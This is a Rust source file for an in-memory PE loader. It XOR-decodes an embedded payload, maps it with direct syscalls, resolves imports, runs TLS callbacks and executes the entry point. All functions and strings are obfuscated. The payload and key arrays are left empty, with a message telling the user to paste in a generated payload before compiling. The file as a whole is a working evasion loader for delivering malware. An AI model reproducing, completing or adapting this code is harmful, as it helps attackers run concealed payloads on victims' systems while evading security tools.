use obfuscator::{obfuscate, obfuscate_string};

#[cfg(windows)]
mod syscalls;

#[cfg(windows)]
use std::{mem, ptr};

#[cfg(windows)]
use winapi::shared::minwindef::{DWORD, HMODULE, LPVOID};
#[cfg(windows)]
use winapi::um::errhandlingapi::GetLastError;
#[cfg(windows)]
use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
#[cfg(windows)]
use winapi::um::processthreadsapi::GetCurrentProcess;
#[cfg(windows)]
use winapi::um::winnt::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE, PAGE_READONLY,
    PAGE_READWRITE,
};

// PE Header structures
#[repr(C)]
#[allow(dead_code)]
struct ImageDosHeader {
    e_magic: u16, e_cblp: u16, e_cp: u16, e_crlc: u16, e_cparhdr: u16, e_minalloc: u16,
    e_maxalloc: u16, e_ss: u16, e_sp: u16, e_csum: u16, e_ip: u16, e_cs: u16,
    e_lfarlc: u16, e_ovno: u16, e_res: [u16; 4], e_oemid: u16, e_oeminfo: u16,
    e_res2: [u16; 10], e_lfanew: i32,
}
#[repr(C)]
#[allow(dead_code)]
struct ImageFileHeader {
    machine: u16, number_of_sections: u16, time_date_stamp: u32,
    pointer_to_symbol_table: u32, number_of_symbols: u32, size_of_optional_header: u16,
    characteristics: u16,
}

#[repr(C)]
#[allow(dead_code)]
struct ImageOptionalHeader64 {
    magic: u16, major_linker_version: u8, minor_linker_version: u8, size_of_code: u32,
    size_of_initialized_data: u32, size_of_uninitialized_data: u32,
    address_of_entry_point: u32, base_of_code: u32, image_base: usize,
    section_alignment: u32, file_alignment: u32, major_operating_system_version: u16,
    minor_operating_system_version: u16, major_image_version: u16, minor_image_version: u16,
    major_subsystem_version: u16, minor_subsystem_version: u16, win32_version_value: u32,
    size_of_image: u32, size_of_headers: u32, check_sum: u32, subsystem: u16,
    dll_characteristics: u16, size_of_stack_reserve: usize, size_of_stack_commit: usize,
    size_of_heap_reserve: usize, size_of_heap_commit: usize, loader_flags: u32,
    number_of_rva_and_sizes: u32,
}

#[repr(C)]
#[allow(dead_code)]
struct ImageNtHeaders64 {
    signature: u32,
    file_header: ImageFileHeader,
    optional_header: ImageOptionalHeader64,
}

#[repr(C)]
#[allow(dead_code)]
struct ImageSectionHeader {
    name: [u8; 8], virtual_size: u32, virtual_address: u32, size_of_raw_data: u32,
    pointer_to_raw_data: u32, pointer_to_relocations: u32, pointer_to_linenumbers: u32,
    number_of_relocations: u16, number_of_linenumbers: u16, characteristics: u32,
}
#[repr(C)]
#[allow(dead_code)]
struct ImageDataDirectory { virtual_address: u32, size: u32 }
#[repr(C)]
#[allow(dead_code)]
struct ImageImportDescriptor {
    original_first_thunk: u32, time_date_stamp: u32, forwarder_chain: u32, name: u32,
    first_thunk: u32,
}
#[repr(C)]
#[allow(dead_code)]
struct ImageImportByName { hint: u16, name: [u8; 1] }
#[repr(C)]
#[allow(dead_code)]
struct ImageBaseRelocation { virtual_address: u32, size_of_block: u32 }
#[repr(C)]
#[allow(dead_code)]
struct ImageTlsDirectory64 {
    start_address_of_raw_data: u64, end_address_of_raw_data: u64, address_of_index: u64,
    address_of_callbacks: u64, size_of_zero_fill: u32, characteristics: u32,
}

#[cfg(windows)]
const IMAGE_SCN_MEM_EXECUTE: u32 = 0x20000000;
#[cfg(windows)]
const IMAGE_SCN_MEM_READ: u32 = 0x40000000;
#[cfg(windows)]
const IMAGE_SCN_MEM_WRITE: u32 = 0x80000000;
#[cfg(windows)]
const IMAGE_DIRECTORY_ENTRY_IMPORT: usize = 1;
#[cfg(windows)]
const IMAGE_DIRECTORY_ENTRY_BASERELOC: usize = 5;
#[cfg(windows)]
const IMAGE_DIRECTORY_ENTRY_TLS: usize = 9;

#[cfg(windows)]
const SECRET_KEY: &[u8] = &[

];


#[cfg(windows)]
const PAYLOAD: &[u8] = &[

];

#[cfg(windows)]
#[obfuscate(garbage = true, len = 12)]
unsafe fn get_data_directory(nt_headers: *const ImageNtHeaders64, index: usize) -> *const ImageDataDirectory {
    let optional_header_ptr = &(*nt_headers).optional_header as *const ImageOptionalHeader64;
    let data_dir_ptr = (optional_header_ptr as usize + mem::offset_of!(ImageOptionalHeader64, number_of_rva_and_sizes) + mem::size_of::<u32>()) as *const ImageDataDirectory;
    data_dir_ptr.add(index)
}

#[cfg(windows)]
#[obfuscate(garbage = true, len = 12)]
unsafe fn set_section_permissions(image_base: *mut u8, section: &ImageSectionHeader) -> Result<(), String> {
    let characteristics = section.characteristics;
    let mut protect = PAGE_READONLY;
    if (characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 {
        if (characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
            protect = PAGE_EXECUTE_READWRITE;
        } else if (characteristics & IMAGE_SCN_MEM_READ) != 0 {
            protect = PAGE_EXECUTE_READ;
        }
    } else if (characteristics & IMAGE_SCN_MEM_WRITE) != 0 {
        protect = PAGE_READWRITE;
    } else if (characteristics & IMAGE_SCN_MEM_READ) != 0 {
        protect = PAGE_READONLY;
    }
    let section_start = image_base.add(section.virtual_address as usize);
    let mut old_protect = 0;
    let mut region_size = section.virtual_size as usize;
    let status = (syscalls::SYSCALLS.NtProtectVirtualMemory)(
        GetCurrentProcess() as *mut _,
        &mut (section_start as *mut _),
        &mut region_size,
        protect,
        &mut old_protect,
    );
    if status != 0 {
        return Err(format!("{}{}", obfuscate_string!("Failed to set section protection with status: "), status));
    }
    Ok(())
}

#[cfg(windows)]
#[obfuscate(garbage = true, len = 12)]
unsafe fn process_relocations(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
    let reloc_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (*reloc_dir).virtual_address == 0 {
        return Ok(());
    }
    let preferred_base = (*nt_headers).optional_header.image_base;
    let delta = image_base as isize - preferred_base as isize;
    if delta == 0 {
        return Ok(());
    }
    let mut reloc_ptr = image_base.add((*reloc_dir).virtual_address as usize) as *const ImageBaseRelocation;
    let reloc_end = (reloc_ptr as usize + (*reloc_dir).size as usize) as *const ImageBaseRelocation;

    while (reloc_ptr as usize) < (reloc_end as usize) && (*reloc_ptr).size_of_block > 0 {
        let count = ((*reloc_ptr).size_of_block as usize - mem::size_of::<ImageBaseRelocation>()) / 2;
        let entries = (reloc_ptr as usize + mem::size_of::<ImageBaseRelocation>()) as *const u16;
        for i in 0..count {
            let entry = *entries.add(i);
            let reloc_type = entry >> 12;
            let offset = entry & 0xFFF;
            if reloc_type == 3 {
                let patch_addr = image_base.add((*reloc_ptr).virtual_address as usize + offset as usize) as *mut u32;
                *patch_addr = ((*patch_addr as isize) + delta) as u32;
            } else if reloc_type == 10 {
                let patch_addr = image_base.add((*reloc_ptr).virtual_address as usize + offset as usize) as *mut u64;
                *patch_addr = ((*patch_addr as isize) + delta) as u64;
            }
        }
        reloc_ptr = (reloc_ptr as usize + (*reloc_ptr).size_of_block as usize) as *const ImageBaseRelocation;
    }
    Ok(())
}

#[cfg(windows)]
#[obfuscate(garbage = true)]
unsafe fn resolve_imports(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
    let import_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (*import_dir).virtual_address == 0 {
        return Ok(());
    }
    let mut import_desc = image_base.add((*import_dir).virtual_address as usize) as *const ImageImportDescriptor;
    while (*import_desc).name != 0 {
        let dll_name_ptr = image_base.add((*import_desc).name as usize);
        let dll_name = std::ffi::CStr::from_ptr(dll_name_ptr as *const i8);
        let module = LoadLibraryA(dll_name_ptr as *const i8);
        if module.is_null() {
            return Err(format!("{}{:?}{}{}", obfuscate_string!("Failed to load DLL: "), dll_name, obfuscate_string!(" (error: "), GetLastError()));
        }
        let mut thunk_ref = if (*import_desc).original_first_thunk != 0 {
            image_base.add((*import_desc).original_first_thunk as usize) as *const usize
        } else {
            image_base.add((*import_desc).first_thunk as usize) as *const usize
        };
        let mut func_ref = image_base.add((*import_desc).first_thunk as usize) as *mut usize;
        while *thunk_ref != 0 {
            let func_addr = if (*thunk_ref & (1 << 63)) != 0 {
                let ordinal = (*thunk_ref & 0xFFFF) as u16;
                GetProcAddress(module, ordinal as usize as *const i8)
            } else {
                let import_by_name = image_base.add(*thunk_ref as usize) as *const ImageImportByName;
                let func_name_ptr = &(*import_by_name).name as *const u8 as *const i8;
                GetProcAddress(module, func_name_ptr)
            };
            if func_addr.is_null() {
                return Err(format!("{}{}", obfuscate_string!("Failed to import function (error: "), GetLastError()));
            }
            *func_ref = func_addr as usize;
            thunk_ref = thunk_ref.add(1);
            func_ref = func_ref.add(1);
        }
        import_desc = import_desc.add(1);
    }
    Ok(())
}

#[cfg(windows)]
#[obfuscate(garbage = true, len = 12, control_f = true)]
unsafe fn process_tls_callbacks(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
    let tls_dir = get_data_directory(nt_headers, IMAGE_DIRECTORY_ENTRY_TLS);
    if (*tls_dir).virtual_address == 0 {
        return Ok(());
    }
    let tls = image_base.add((*tls_dir).virtual_address as usize) as *const ImageTlsDirectory64;
    let callbacks_addr = (*tls).address_of_callbacks as usize;
    if callbacks_addr == 0 {
        return Ok(());
    }
    let mut callback_ptr = callbacks_addr as *const usize;
    while *callback_ptr != 0 {
        let callback: extern "system" fn(LPVOID, DWORD, LPVOID) = mem::transmute(*callback_ptr);
        callback(image_base as LPVOID, 1, ptr::null_mut());
        callback_ptr = callback_ptr.add(1);
    }
    Ok(())
}

#[cfg(windows)]
#[obfuscate(garbage = true, len = 12, control_f = true)]
unsafe fn finalize_sections(image_base: *mut u8, nt_headers: *const ImageNtHeaders64) -> Result<(), String> {
    let section_header_ptr = (nt_headers as *const ImageNtHeaders64 as usize
        + mem::size_of::<u32>()
        + mem::size_of::<ImageFileHeader>()
        + (*nt_headers).file_header.size_of_optional_header as usize)
        as *const ImageSectionHeader;
    for i in 0..(*nt_headers).file_header.number_of_sections {
        set_section_permissions(image_base, &*section_header_ptr.offset(i as isize))?;
    }
    (syscalls::SYSCALLS.NtFlushInstructionCache)(
        GetCurrentProcess() as *mut _,
        image_base as *mut _,
        (*nt_headers).optional_header.size_of_image as usize,
    );
    Ok(())
}

#[cfg(windows)]
#[obfuscate(garbage = true, control_f = true)]
unsafe fn load_pe_from_memory(pe_data: &[u8]) -> Result<(), String> {
    if pe_data.len() < mem::size_of::<ImageDosHeader>() {
        return Err(obfuscate_string!("PE data is too small for DOS header").to_string());
    }

    let dos_header = &*(pe_data.as_ptr() as *const ImageDosHeader);
    if dos_header.e_magic != 0x5A4D {
        return Err(obfuscate_string!("Invalid PE file (MZ signature missing)").to_string());
    }

    let nt_headers_offset = dos_header.e_lfanew as usize;
    if nt_headers_offset == 0 || (nt_headers_offset + mem::size_of::<ImageNtHeaders64>()) > pe_data.len() {
        return Err(obfuscate_string!("Invalid NT header offset or file is too small.").to_string());
    }

    let nt_headers = &*(pe_data.as_ptr().add(nt_headers_offset) as *const ImageNtHeaders64);
    if nt_headers.signature != 0x4550 {
        return Err(obfuscate_string!("Invalid PE signature").to_string());
    }

    if nt_headers.optional_header.magic != 0x20b {
        return Err(obfuscate_string!("Loader only supports 64-bit (x64) PE files.").to_string());
    }

    let image_size = nt_headers.optional_header.size_of_image as usize;
    if image_size == 0 {
        return Err(obfuscate_string!("Invalid PE file (SizeOfImage is zero)").to_string());
    }

    let mut image_base: *mut std::ffi::c_void = ptr::null_mut();
    let mut region_size = image_size;
    let status = (syscalls::SYSCALLS.NtAllocateVirtualMemory)(
        GetCurrentProcess() as *mut _,
        &mut image_base,
        0,
        &mut region_size,
        (MEM_COMMIT | MEM_RESERVE) as u32,
        PAGE_READWRITE as u32,
    );

    if status != 0 {
        return Err(format!("{}{}", obfuscate_string!("Memory allocation failed with status: "), status));
    }

    let headers_size = nt_headers.optional_header.size_of_headers as usize;
    ptr::copy_nonoverlapping(pe_data.as_ptr(), image_base as *mut u8, headers_size);

    let section_header_ptr = (nt_headers as *const _ as usize
        + mem::size_of::<u32>()
        + mem::size_of::<ImageFileHeader>()
        + nt_headers.file_header.size_of_optional_header as usize)
        as *const ImageSectionHeader;

    for i in 0..nt_headers.file_header.number_of_sections {
        let section = &*section_header_ptr.offset(i as isize);
        if section.size_of_raw_data > 0 {
            let dest = (image_base as usize + section.virtual_address as usize) as *mut u8;
            let src = pe_data.as_ptr().offset(section.pointer_to_raw_data as isize);
            ptr::copy_nonoverlapping(src, dest, section.size_of_raw_data as usize);
        }
    }

    process_relocations(image_base as *mut u8, nt_headers)?;
    resolve_imports(image_base as *mut u8, nt_headers)?;
    finalize_sections(image_base as *mut u8, nt_headers)?;
    process_tls_callbacks(image_base as *mut u8, nt_headers)?;

    let entry_point = (image_base as usize + nt_headers.optional_header.address_of_entry_point as usize) as *const ();

    if nt_headers.optional_header.subsystem == 2 || nt_headers.optional_header.subsystem == 3 {
        let entry_fn: extern "system" fn() -> i32 = mem::transmute(entry_point);
        entry_fn();
    } else {
        let dll_main: extern "system" fn(HMODULE, u32, *mut u8) -> i32 = mem::transmute(entry_point);
        dll_main(image_base as HMODULE, 1, ptr::null_mut()); // DLL_PROCESS_ATTACH
    }

    Ok(())
}

#[cfg(windows)]
#[obfuscate(garbage = true, control_f = true, len = 20)]
fn transform_data(data: &[u8], key: &[u8]) -> Vec<u8> {
    if key.is_empty() {
        return data.to_vec();
    }
    data.iter().enumerate().map(|(i, byte)| byte ^ key[i % key.len()]).collect()
}

#[obfuscate(main = true, garbage = true, control_f = true)]
fn main() {
    #[cfg(windows)]
    {
        if PAYLOAD.is_empty() {
            eprintln!("{}", obfuscate_string!("[ERROR] The PAYLOAD is empty. Please generate a payload and paste it into the source code before compiling."));
            return;
        }

        let decoded_payload = transform_data(PAYLOAD, SECRET_KEY);

        unsafe {
            if let Err(e) = load_pe_from_memory(&decoded_payload) {
                eprintln!("{}{}", obfuscate_string!("[ERROR] Failed to load PE from memory: "), e);
            }
        }
    }

    #[cfg(not(windows))]
    {
        eprintln!("{}", obfuscate_string!("[ERROR] This program is intended to run on Windows only."));
    }
}
